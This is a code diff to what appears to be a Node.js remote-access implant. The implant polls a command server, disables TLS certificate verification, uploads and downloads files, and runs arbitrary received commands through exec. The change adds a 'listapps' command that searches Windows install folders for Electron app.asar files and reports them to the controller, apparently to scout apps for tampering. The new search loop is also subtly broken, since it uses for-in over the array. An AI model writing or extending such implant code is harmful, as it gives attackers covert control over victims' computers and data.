@@ -49,6 +49,13 @@ const postRequests = [
 //ignore cert security
 process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
 
+//install dirs for looking for other electron apps
+const installDirs = [
+        process.env.LOCALAPPDATA,
+        'C:\\Program Files',
+        'C:\\Program Files (x86)',
+    ];
+
 function generateSessionID() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let result = '';
@@ -109,6 +116,42 @@ function downloadFile(file) {
     req.end();
 }
 
+function findElectronApps(dir, results=[]) {
+    if (!fs.existsSync(dir)) return results;
+
+    try {
+        const entries = fs.readdirSync(dir, { withFileTypes: true });
+        for (const entry in entries) {
+            const fullPath = path.join(dir, entry.name);
+
+            if (entry.isDirectory()) {
+                if (!fullPath.includes('Windows')) {
+                    findElectronApps(fullPath, results);
+                }
+            } else if (entry.isFile() && entry.name == 'app.asar') {
+                results.push(fullPath);
+            }
+        }
+    } catch (err) {
+        sendOutput(err)
+    }
+
+    
+    return results;
+}
+
+function listInstalled() {
+    for (const dir of installDirs) {
+        sendOutput(`Searching: ${dir}`)
+        const results = findElectronApps(dir);
+        results.forEach(file => {
+            sendOutput(`Electron App Found: ${file}`)
+        })
+    }
+
+}
+
+
 function pollServer() {
 
     // generate sessionID on first request
@@ -158,6 +201,8 @@ function pollServer() {
                         uploadFile(data.split(' ')[1]);
                     } else if (data.split(' ')[0] == "download") {
                         downloadFile(data.split(' ')[1]);
+                    } else if (data == "listapps") {
+                        listInstalled()
                     } else {
                         exec(data, (error, stdout, stderr) => {
                             if (error) {
